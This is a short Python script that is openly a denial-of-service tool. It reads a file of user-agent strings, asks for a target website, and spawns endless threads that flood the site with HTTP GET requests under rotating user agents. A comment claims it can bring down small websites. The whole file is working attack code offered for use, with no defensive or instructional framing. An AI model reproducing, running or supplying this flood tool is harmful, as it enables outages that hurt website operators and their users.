import socket, threading, requests, random, time
#this can most likely bring down small websites.
while True:
    file = input("[+] Enter the file with bots: ")
    try:
        with open(file, 'r') as useragentlist:
            useragentlists = useragentlist.readlines()
        useragents = []
        for agents in useragentlists:
            useragents.append(agents.strip())
        break
    except:
        print("[+] Invalid File Specified.")
while True:
    ip = input("[+] Enter IP to attack(include the 'https://www.'): ")
    if 'http' not in ip and 'https' not in ip:
        print("[+] Please include the https:// when inputting the IP and also the www. if it is a website.")
    else:
        print('[+] Website to be Attacked:', ip)
        print('\n[+] Getting Bots/Useragents Ready........')
        break
for agent in useragents:
    print(f"[+] Bot: {agent} is ready.")
def ddos():
    while True:
        try:
            headers = {"User-Agent": useragents[random.randint(0, (len(useragents)-1))]}
            response = requests.get(ip, headers=headers)
            print(f'[+] Server Response: {response}')
        except:
            pass
while True:
    try:
        x = threading.Thread(target=ddos)
        x.start()
    except:
        pass
